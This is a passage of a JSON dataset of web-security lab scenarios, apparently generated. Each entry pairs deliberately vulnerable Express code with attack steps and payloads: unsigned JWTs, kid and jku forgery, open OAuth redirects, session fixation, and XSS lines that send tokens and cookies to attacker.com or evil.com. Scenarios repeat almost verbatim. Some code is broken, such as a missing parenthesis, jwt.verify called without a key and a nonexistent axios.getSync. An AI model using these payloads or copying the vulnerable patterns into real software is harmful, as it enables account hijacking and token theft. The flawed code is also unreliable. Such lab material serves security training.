        "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst cookieParser = require('cookie-parser');\n\nconst app = express();\napp.use(cookieParser());\n\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\n\nconst sessions = {};\n\nwss.on('connection', (ws, req) => {\n  let sessionId = req.cookies.session || 'sess_' + Math.random().toString(36).substr(2, 10);\n  sessions[sessionId] = { authenticated: false };\n  \n  ws.on('message', (message) => {\n    try {\n      const data = JSON.parse(message);\n      if (data.type === 'login') {\n        if (data.username === 'admin' && data.password === 'admin123') {\n          sessions[sessionId].authenticated = true;\n          sessions[sessionId].user = 'admin';\n          ws.send(JSON.stringify({ type: 'auth', status: 'success' }));\n        } else {\n          ws.send(JSON.stringify({ type: 'auth', status: 'failure' }));\n        }\n      } else if (data.type === 'admin_command') {\n        if (sessions[sessionId].authenticated) {\n          ws.send(JSON.stringify({ type: 'result', data: 'Admin action performed' }));\n        }\n      }\n    } catch (err) {\n      console.error(err);\n    }\n  });\n});",
        "payloads": [
          "{\"type\":\"login\",\"username\":\"admin\",\"password\":\"admin123\"}",
          "{\"type\":\"admin_command\",\"action\":\"get_flag\"}",
          "Cookie: session=fixated_session_id"
        ]
      },
      {
        "Lab scenario": "JWT alg:none bypass in REST API authentication",
        "Lab Description": "The lab's JWT-based authentication fails to properly validate token signatures. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a valid JWT token with admin privileges without knowing the secret key.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept valid JWT token using Burp Suite while logging in as low-privilege user",
            "Decode the token using jwt.io to analyze structure and claims",
            "Modify the token by changing the alg header to 'none' and adding admin:true to payload",
            "Remove the signature section entirely (leave it empty after the second dot)",
            "Submit the modified token in Authorization header to access /admin endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.post('/login', (req, res) => {\n    const {username, password} = req.body;\n    if (username === 'admin' && password === 's3cr3t') {\n        const token = jwt.sign({user: username, admin: true}, 'key123', {algorithm: 'HS256'});\n        return res.json({token});\n    }\n    const token = jwt.sign({user: username, admin: false}, 'key123', {algorithm: 'HS256'});\n    res.json({token});\n});\n\napp.get('/admin', (req, res) => {\n    try {\n        const token = req.headers.authorization.split(' ')[1];\n        const decoded = jwt.verify(token, {algorithms: ['HS256', 'none']});\n        if (decoded.admin) return res.send('Admin dashboard');\n        res.status(403).send('Forbidden');\n    } catch (e) {\n        res.status(401).send('Invalid token');\n    }\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.",
            "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiY2FybG9zIiwiYWRtaW4iOnRydWV9."
        ]
    },
    {
        "Lab scenario": "GraphQL query injection in user search functionality",
        "Lab Description": "The lab's GraphQL endpoint improperly sanitizes user input in search queries. The application exposes sensitive fields through introspection. To solve: extract all user credentials via a single malicious GraphQL query.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Discover GraphQL endpoint using OWASP ZAP's forced browsing",
            "Enable introspection and dump schema using GraphQL Voyager",
            "Craft query with nested fields to bypass field restrictions",
            "Inject malicious query through search parameter using Postman",
            "Extract password hashes and crack offline using John the Ripper"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\n\nconst schema = buildSchema(`\n  type User {\n    id: ID!\n    username: String!\n    email: String!\n    password: String!\n  }\n  type Query {\n    searchUsers(term: String!): [User]\n  }\n`);\n\nconst root = {\n  searchUsers: ({term}) => {\n    return users.filter(u => \n      u.username.includes(term) || \n      u.email.includes(term)\n  }\n};\n\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(4000);",
        "payloads": [
            "query { searchUsers(term:\"' OR '1'='1'\") { id username email password } }",
            "query { __schema { types { name fields { name type { name } } } } }",
            "query { searchUsers(term:\"*\") { ... on User { id username password } } }"
        ]
    },
    {
        "Lab scenario": "OAuth token hijacking via open redirect",
        "Lab Description": "The lab's OAuth implementation fails to validate redirect URIs, allowing token interception. The application uses implicit flow with improper state validation. To solve: steal an OAuth token and authenticate as another user.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Identify OAuth flow using Burp Suite by analyzing /oauth/authorize requests",
            "Register malicious redirect URI pointing to attacker-controlled server",
            "Craft phishing link with modified redirect_uri parameter",
            "Intercept authorization code/token when victim clicks link",
            "Exchange code for access token or use token directly in API calls"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = {\n  'client123': {secret: 'sec123', redirectURIs: ['https://client.com/callback']}\n};\n\napp.get('/oauth/authorize', (req, res) => {\n  const {client_id, redirect_uri, state} = req.query;\n  if (!clients[client_id]) return res.status(400).send('Invalid client');\n  \n  const token = 'rand0mt0k3n';\n  const redirect = `${redirect_uri}?code=${token}&state=${state}`;\n  res.redirect(redirect);\n});\n\napp.post('/oauth/token', (req, res) => {\n  const {code, client_id, client_secret} = req.body;\n  if (clients[client_id] && clients[client_id].secret === client_secret) {\n    return res.json({access_token: 'useraccesstoken'});\n  }\n  res.status(401).send('Unauthorized');\n});\n\napp.listen(3000);",
        "payloads": [
            "https://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://attacker.com&response_type=token&state=123",
            "https://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://client.com.collab.domain&response_type=code&state=abc",
            "https://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://client.com%0d%0aLocation:%20https://attacker.com&response_type=token"
        ]
    },
    {
        "Lab scenario": "JWT alg:none bypass in REST API authentication",
        "Lab Description": "The lab's JWT implementation fails to properly verify the token signature. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a valid JWT token with admin privileges without knowing the secret key.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept a valid user session request with Burp Suite to capture a sample JWT",
            "Decode the JWT using jwt.io to analyze its structure and claims",
            "Modify the algorithm header to 'none' and change the role claim to 'admin'",
            "Remove the signature portion of the JWT (after the last dot)",
            "Submit the modified token in the Authorization header to access admin functionality"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst users = {\n  user1: { password: 'pass123', role: 'user' },\n  admin: { password: 'adminPass', role: 'admin' }\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    const token = jwt.sign({ user: username, role: users[username].role }, 'secretKey');\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  try {\n    const decoded = jwt.decode(token, { complete: true });\n    if (decoded.payload.role === 'admin') {\n      res.send('Admin panel accessed');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => console.log(`Server running on port ${PORT}`));",
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidXNlcjEiLCJyb2xlIjoiYWRtaW4ifQ.",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InVzZXIxIiwicm9sZSI6ImFkbWluIn0.",
            "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."
        ]
    },
    {
        "Lab scenario": "OAuth token leakage via misconfigured redirect_uri",
        "Lab Description": "The OAuth implementation leaks authorization codes through open redirects. The application fails to validate redirect_uri against pre-registered URIs. To solve: steal an OAuth token by manipulating the redirect flow to a controlled server.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Identify OAuth authorization endpoint and parameters using OWASP ZAP",
            "Register a malicious callback URI containing attacker-controlled domain",
            "Initiate OAuth flow with victim's email via Postman",
            "Intercept authorization response containing leaked code",
            "Exchange code for access token at the OAuth token endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = {\n  'client123': {\n    secret: 'sec123',\n    redirectUris: ['https://trusted.com/callback']\n  }\n};\n\napp.get('/authorize', (req, res) => {\n  const { client_id, redirect_uri, state } = req.query;\n  const code = 'AUTH_CODE_' + Math.random().toString(36).substring(2);\n  \n  res.redirect(`${redirect_uri}?code=${code}&state=${state}`);\n});\n\napp.post('/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  if (clients[client_id] && clients[client_id].secret === client_secret) {\n    res.json({\n      access_token: 'ACCESS_TOKEN_' + Math.random().toString(36).substring(2),\n      token_type: 'bearer'\n    });\n  } else {\n    res.status(401).send('Invalid client credentials');\n  }\n});\n\nconst PORT = 3001;\napp.listen(PORT, () => console.log(`OAuth server running on port ${PORT}`));",
        "payloads": [
            "https://attacker.com/callback?code=STOLEN_CODE&state=123",
            "https://trusted.com.evil.com/callback?code=STOLEN_CODE",
            "https://trusted.com@evil.com/callback?code=STOLEN_CODE"
        ]
    },
    {
        "Lab scenario": "Session fixation in GraphQL authentication endpoint",
        "Lab Description": "The GraphQL API assigns session tokens before authentication is complete. The application doesn't regenerate session tokens after login. To solve: fixate a session token on victim's browser then capture their authenticated session.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Send initial GraphQL query to /graphql endpoint using Postman to obtain session cookie",
            "Craft malicious link containing the session token in URL parameter",
            "Trick victim into authenticating while using the fixated session",
            "Monitor authenticated requests with the known session token in Burp Suite",
            "Reuse the session token to access victim's account"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst cookieParser = require('cookie-parser');\n\nconst app = express();\napp.use(cookieParser());\n\nconst schema = buildSchema(`\n  type Query {\n    getSession: String\n  }\n  type Mutation {\n    login(username: String!, password: String!): String\n  }\n`);\n\nconst root = {\n  getSession: (args, req) => {\n    if (!req.cookies.session) {\n      const session = 'SESS_' + Math.random().toString(36).substring(2);\n      req.res.cookie('session', session);\n      return 'New session created';\n    }\n    return 'Existing session';\n  },\n  login: ({username, password}, req) => {\n    if (username === 'admin' && password === 'admin123') {\n      return 'Login successful';\n    }\n    return 'Invalid credentials';\n  }\n};\n\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`GraphQL server running on port ${PORT}`));",
        "payloads": [
            "https://vulnerable.com/graphql?session=SESS_ATTACKER_TOKEN",
            "<script>document.cookie='session=SESS_ATTACKER_TOKEN'</script>",
            "https://vulnerable.com/graphql?redirect=https://evil.com&session=SESS_ATTACKER_TOKEN"
        ]
    },
    {
        "Lab scenario": "JWT alg:none exploitation in REST API authentication",
        "Lab Description": "The application uses JSON Web Tokens for session management but fails to properly validate the signature. The vulnerable endpoint accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a modified JWT to escalate privileges to admin without valid credentials.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept valid user session request with Burp Suite to capture JWT",
            "Decode the JWT using jwt.io or Burp Decoder to analyze structure",
            "Modify the alg header to 'none' and remove signature section",
            "Alter payload claims (role→admin) and submit to /api/admin",
            "Verify admin dashboard access confirms privilege escalation"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\nconst SECRET = 'insecure_secret';\napp.get('/api/admin', (req, res) => {\n    const token = req.headers.authorization.split(' ')[1];\n    try {\n        const decoded = jwt.decode(token, { complete: true });\n        if (decoded.header.alg === 'none') {\n            const payload = decoded.payload;\n            if (payload.role === 'admin') {\n                return res.send('Admin dashboard');\n            }\n        } else {\n            jwt.verify(token, SECRET);\n        }\n    } catch (e) {\n        return res.status(403).send('Forbidden');\n    }\n    res.status(401).send('Unauthorized');\n});\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjE1OTY1ODQwfQ.",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE1MTYyMzkwMjJ9."
        ]
    },
    {
        "Lab scenario": "GraphQL batching attack in user enumeration endpoint",
        "Lab Description": "The GraphQL API implements authentication checks inefficiently, allowing batch queries to bypass rate limiting. The /graphql endpoint processes multiple authentication attempts in a single request. To solve: perform credential stuffing with 100+ combinations in one HTTP request to discover valid credentials.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Capture normal login request with OWASP ZAP and convert to GraphQL format",
            "Craft batch query with 100 credential pairs using Postman",
            "Identify successful login by response time differentials",
            "Extract session token from successful authentication",
            "Access restricted /profile endpoint with stolen credentials"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const { ApolloServer } = require('apollo-server-express');\nconst typeDefs = gql`\n  type Query {\n    login(username: String!, password: String!): AuthPayload\n  }\n  type AuthPayload {\n    token: String\n  }\n`;\nconst resolvers = {\n  Query: {\n    login: (_, { username, password }) => {\n      const user = users.find(u => u.username === username);\n      if (!user || user.password !== password) return { token: null };\n      return { token: 'generated_jwt_token' };\n    }\n  }\n};\nconst server = new ApolloServer({ typeDefs, resolvers });\nserver.applyMiddleware({ app });",
        "payloads": [
            "[{\"query\":\"query($input:LoginInput!){login(input:$input){token}}\",\"variables\":{\"input\":{\"username\":\"admin\",\"password\":\"password123\"}}},{\"query\":\"query($input:LoginInput!){login(input:$input){token}}\",\"variables\":{\"input\":{\"username\":\"admin\",\"password\":\"123456\"}}}]",
            "{\"query\":\"query{login1:login(username:\\\"carlos\\\",password:\\\"letmein\\\"){token} login2:login(username:\\\"carlos\\\",password:\\\"welcome1\\\"){token}}\"}"
        ]
    },
    {
        "Lab scenario": "OAuth token hijacking via open redirect in authorization flow",
        "Lab Description": "The OAuth 2.0 implementation fails to validate redirect_uri parameters, allowing attackers to intercept authorization codes. The vulnerable /oauth/authorize endpoint accepts arbitrary redirect destinations. To solve: construct malicious redirect URI to capture victim's token after they authenticate.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Identify OAuth initiation endpoint with Burp Suite",
            "Modify redirect_uri parameter to attacker-controlled domain",
            "Social engineer victim to initiate OAuth flow",
            "Intercept authorization code at malicious endpoint",
            "Exchange code for access token at /oauth/token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\nconst oauth2 = require('simple-oauth2').create({\n  client: { id: 'client_id', secret: 'client_secret' },\n  auth: { tokenHost: 'http://localhost:3000' }\n});\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri, state } = req.query;\n  if (!client_id) return res.status(400).send('Invalid client');\n  const authCode = generateAuthCode();\n  res.redirect(`${redirect_uri}?code=${authCode}&state=${state}`);\n});\napp.post('/oauth/token', (req, res) => {\n  const { code, redirect_uri } = req.body;\n  const token = oauth2.accessToken.create({ access_token: 'token', expires_in: 3600 });\n  res.json(token);\n});\napp.listen(3000);",
        "payloads": [
            "http://localhost:3000/oauth/authorize?response_type=code&client_id=webapp&redirect_uri=https://attacker.com/callback&scope=profile",
            "http://localhost:3000/oauth/authorize?client_id=mobileapp&redirect_uri=http%3A%2F%2Fevil.com%2Fsteal&state=123&response_type=code"
        ]
    },
    {
        "Lab scenario": "Session fixation via XSS in JWT generation endpoint",
        "Lab Description": "The application's JWT generation endpoint reflects user-controlled input without proper encoding. The vulnerable /api/jwt/generate endpoint echoes back the username in JWT claims when debug mode is active. To solve: chain stored XSS with session fixation to hijack admin session tokens.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Identify JWT generation endpoint using OWASP ZAP spider",
            "Inject XSS payload in username parameter during JWT request",
            "Capture admin session when they view logs containing malicious JWT",
            "Extract valid JWT from admin's browser via XSS callback",
            "Replay stolen JWT in Authorization header to access /admin"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(express.json());\napp.post('/api/jwt/generate', (req, res) => {\n    const { username } = req.body;\n    const token = jwt.sign({ \n        user: username,\n        debug: process.env.DEBUG ? username : 'redacted'\n    }, 'weak_secret');\n    res.json({ token });\n});\napp.get('/admin', (req, res) => {\n    try {\n        const token = req.headers.authorization.split(' ')[1];\n        const decoded = jwt.verify(token, 'weak_secret');\n        if (decoded.user === 'admin') return res.send('Admin panel');\n    } catch (e) {\n        return res.status(403).send('Invalid token');\n    }\n    res.status(401).send('Unauthorized');\n});\napp.listen(3000);",
        "payloads": [
            "{\"username\":\"<script>fetch('https://attacker.com/steal?token='+localStorage.getItem('token'))</script>\"}",
            "{\"username\":\"admin'\\\"</title><svg/onload=alert(document.cookie)>\"}"
        ]
    },
    {
        "Lab scenario": "OAuth token leakage via misconfigured CORS in identity provider",
        "Lab Description": "The OAuth provider's CORS policy allows arbitrary origins to access token endpoints. The vulnerable /oauth/token endpoint responds with Access-Control-Allow-Origin: * headers. To solve: craft malicious JavaScript to retrieve victim's OAuth tokens cross-origin.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept OAuth flow with Burp Suite to identify token endpoint",
            "Verify permissive CORS headers in OPTIONS responses",
            "Create malicious page with XMLHttpRequest to /oauth/token",
            "Social engineer victim to visit attacker page while authenticated",
            "Harvest OAuth tokens from attacker server logs"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst cors = require('cors');\nconst app = express();\napp.use(cors({\n    origin: '*',\n    methods: ['GET','POST'],\n    allowedHeaders: ['Authorization']\n}));\nconst tokens = {};\napp.post('/oauth/token', (req, res) => {\n    const { code } = req.body;\n    if (tokens[code]) {\n        res.json({\n            access_token: tokens[code],\n            token_type: 'Bearer'\n        });\n    } else {\n        res.status(400).json({ error: 'invalid_grant' });\n    }\n});\napp.listen(3001);",
        "payloads": [
            "fetch('https://oauth-provider/oauth/token', {\n  method: 'POST',\n  body: 'code=VICTIM_CODE',\n  credentials: 'include'\n}).then(r=>r.json()).then(token=>{\n  fetch('https://attacker.com/log?token='+token.access_token)\n});",
            "var xhr = new XMLHttpRequest();\nxhr.open('POST', 'https://oauth-provider/oauth/token', true);\nxhr.withCredentials = true;\nxhr.send('code=VICTIM_CODE');\nxhr.onload=function(){ document.location='https://attacker.com/steal?token='+JSON.parse(this.responseText).access_token; };"
        ]
    },
    {
        "Lab scenario": "JWT kid header path traversal in microservice authentication",
        "Lab Description": "The JWT verification service blindly trusts the kid header to load verification keys. The vulnerable /verify endpoint allows directory traversal in kid parameter. To solve: manipulate kid header to point to attacker-controlled key file and forge valid tokens.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Capture valid JWT using Burp Suite and analyze header",
            "Modify kid parameter to traverse to /dev/null or predictable file",
            "Generate symmetric key matching predictable file content",
            "Forge new JWT with modified claims using generated key",
            "Access internal /api/admin endpoint with forged token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\napp.post('/verify', (req, res) => {\n    const token = req.body.token;\n    const header = jwt.decode(token, {complete: true}).header;\n    const key = fs.readFileSync('/keys/'+header.kid);\n    try {\n        jwt.verify(token, key);\n        res.json({valid: true});\n    } catch(e) {\n        res.json({valid: false});\n    }\n});\napp.get('/api/admin', (req, res) => {\n    const token = req.headers.authorization?.split(' ')[1];\n    if (!token) return res.status(401).send('Unauthorized');\n    const header = jwt.decode(token, {complete: true}).header;\n    const key = fs.readFileSync('/keys/'+header.kid);\n    try {\n        const decoded = jwt.verify(token, key);\n        if (decoded.role === 'admin') return res.send('Admin access granted');\n    } catch(e) {}\n    res.status(403).send('Forbidden');\n});\napp.listen(3002);",
        "payloads": [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uL2Rldi9udWxsIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.7s8X9xqZ0Q45t0z7Q9X7xqZ0Q45t0z7Q9X7xqZ0Q45t0",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MTU5NjU4NDB9.3J1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MTU5NjU4NDB9"
        ]
    },
    {
        "Lab scenario": "JWT public key substitution via jku header injection",
        "Lab Description": "The JWT validation endpoint trusts arbitrary jku (JSON Key URL) headers without proper verification. The vulnerable /api/validate endpoint processes tokens with externally specified verification keys. To solve: host malicious JWK set and forge admin token with manipulated jku header.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept valid JWT with Burp Suite and analyze headers",
            "Set up attacker-controlled server hosting malicious JWK set",
            "Forge new JWT with jku pointing to attacker server",
            "Modify payload claims to include admin privileges",
            "Submit forged token to /admin/dashboard endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\n\napp.post('/api/validate', async (req, res) => {\n    const token = req.body.token;\n    const header = jwt.decode(token, {complete: true}).header;\n    \n    if (header.jku) {\n        try {\n            const jwks = await axios.get(header.jku);\n            const key = jwks.data.keys[0].x5c[0];\n            jwt.verify(token, key);\n            return res.json({valid: true});\n        } catch(e) {}\n    }\n    res.json({valid: false});\n});\n\napp.get('/admin/dashboard', (req, res) => {\n    const token = req.headers.authorization?.split(' ')[1];\n    if (!token) return res.status(401).send('Unauthorized');\n    \n    const header = jwt.decode(token, {complete: true}).header;\n    if (header.jku) {\n        try {\n            const jwks = require('axios').getSync(header.jku);\n            const key = jwks.data.keys[0].x5c[0];\n            const decoded = jwt.verify(token, key);\n            if (decoded.role === 'admin') return res.send('Admin dashboard');\n        } catch(e) {}\n    }\n    res.status(403).send('Forbidden');\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXItY29udHJvbGxlZC5jb20vbWFsY2lvdXMtanNvbiJ9.eyJzdWIiOiIxMjM0NSIsInJvbGUiOiJhZG1pbiJ9.SIGNATURE",
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9ldmlsLWtleXMifQ.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MTU5NjU4NDB9.SIGNATURE"
        ]
    },
    {
        "Lab scenario": "OAuth token swapping via insecure state parameter validation",
        "Lab Description": "The OAuth implementation fails to properly validate state parameters during token exchange. The vulnerable /oauth/callback endpoint processes authorization codes without verifying bound state values. To solve: intercept victim's OAuth flow and swap their authorization code for an access token.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Initiate OAuth flow and capture requests with OWASP ZAP",
            "Note state parameter value and authorization code",
            "Construct malicious callback URL with victim's code and attacker's state",
            "Trigger token exchange with swapped parameters via Postman",
            "Use stolen token to access victim's resources"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\nconst querystring = require('querystring');\n\nconst tokens = {};\nconst authCodes = {};\n\napp.get('/oauth/callback', (req, res) => {\n    const { code, state } = req.query;\n    \n    if (authCodes[code]) {\n        const token = 'generated_token_' + Math.random().toString(36).substr(2);\n        tokens[token] = authCodes[code];\n        const redirectUri = Buffer.from(state, 'base64').toString();\n        return res.redirect(redirectUri + '?token=' + token);\n    }\n    res.status(400).send('Invalid authorization code');\n});\n\napp.post('/oauth/token', (req, res) => {\n    const { code } = req.body;\n    if (authCodes[code]) {\n        const token = 'generated_token_' + Math.random().toString(36).substr(2);\n        tokens[token] = authCodes[code];\n        return res.json({ access_token: token });\n    }\n    res.status(400).json({ error: 'invalid_grant' });\n});\n\napp.listen(3001);",
        "payloads": [
            "https://oauth-provider/oauth/callback?code=VICTIM_CODE&state=ATTACKER_STATE",
            "POST /oauth/token HTTP/1.1\nHost: oauth-provider\nContent-Type: application/x-www-form-urlencoded\n\ncode=VICTIM_CODE&client_id=legitimate_client"
        ]
    },
    {
        "Lab scenario": "Session fixation via insecure session migration after login",
        "Lab Description": "The application maintains pre-authentication session IDs post-login without regeneration. The vulnerable /login endpoint accepts existing session cookies after authentication. To solve: fixate session on victim's browser then trigger authentication to hijack their logged-in session.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Identify session cookie setting before authentication using Burp",
            "Craft malicious link with fixated session ID",
            "Social engineer victim to authenticate while session is fixated",
            "Reuse victim's session ID to access authenticated endpoints",
            "Access restricted /user/profile data"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\nconst sessions = {};\nconst users = {\n    admin: { password: 'secret123', role: 'admin' }\n};\n\napp.get('/preauth', (req, res) => {\n    const sessionId = req.cookies.session || Math.random().toString(36).substr(2);\n    sessions[sessionId] = { authenticated: false };\n    res.cookie('session', sessionId).send('Session initialized');\n});\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const sessionId = req.cookies.session;\n    \n    if (users[username] && users[username].password === password) {\n        if (sessions[sessionId]) {\n            sessions[sessionId].authenticated = true;\n            sessions[sessionId].username = username;\n            return res.send('Login successful');\n        }\n    }\n    res.status(401).send('Login failed');\n});\n\napp.get('/user/profile', (req, res) => {\n    const sessionId = req.cookies.session;\n    if (sessions[sessionId]?.authenticated) {\n        return res.json(sessions[sessionId]);\n    }\n    res.status(403).send('Access denied');\n});\n\napp.listen(3002);",
        "payloads": [
            "<img src=\"https://vulnerable-app/preauth\" onerror=\"document.location='https://attacker.com/collect?session='+document.cookie\">",
            "https://vulnerable-app/preauth?redirect=https://vulnerable-app/login?username=admin&password=secret123"
        ]
    },
    
    {
        "Lab scenario": "JWT alg:none bypass in REST API authentication",
        "Lab Description": "This lab's JWT implementation fails to properly verify the token signature. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a valid JWT token with admin privileges without knowing the secret key.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept a valid JWT token using Burp Suite while logged in as a low-privilege user",
            "Decode the token using jwt.io or Burp Decoder to analyze its structure",
            "Modify the token by changing the alg header to 'none' and adding admin:true to the payload",
            "Remove the signature portion (set to empty string) and send the modified token",
            "Verify admin access by accessing /admin/dashboard endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.get('/admin/dashboard', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, { complete: true });\n  if (decoded.header.alg === 'none') {\n    const payload = decoded.payload;\n    if (payload.admin) {\n      return res.send('Admin dashboard accessed');\n    }\n  }\n  res.status(403).send('Access denied');\n});\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJhZG1pbiI6dHJ1ZX0.",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiYWRtaW4iOnRydWV9."
        ]
    },
    {
        "Lab scenario": "OAuth token leakage via misconfigured redirect_uri",
        "Lab Description": "This lab's OAuth implementation fails to validate redirect_uri parameters properly. The application leaks authorization codes to arbitrary domains. To solve: steal an OAuth token by manipulating the redirect flow to your attacker server.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Identify the OAuth authorization endpoint using OWASP ZAP",
            "Intercept the initial OAuth flow and modify the redirect_uri parameter to point to your attacker server",
            "Set up a netcat listener on your server to capture incoming requests",
            "Trick the victim into initiating the OAuth flow (or use an existing session)",
            "Capture the authorization code from your server logs and exchange it for an access token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri, state } = req.query;\n  const code = 'RANDOM_CODE_' + Math.random().toString(36).substring(2);\n  return res.redirect(`${redirect_uri}?code=${code}&state=${state}`);\n});\napp.post('/oauth/token', (req, res) => {\n  const { code, client_secret } = req.body;\n  if (code.startsWith('RANDOM_CODE_')) {\n    return res.json({ access_token: 'SECRET_ACCESS_TOKEN' });\n  }\n  res.status(400).json({ error: 'Invalid code' });\n});\napp.listen(3000);",
        "payloads": [
            "https://attacker.com/callback?code=STOLEN_CODE&state=123",
            "http://evil.com/steal?auth_code=LEAKED_TOKEN"
        ]
    },
    {
        "Lab scenario": "Session fixation via GraphQL mutation",
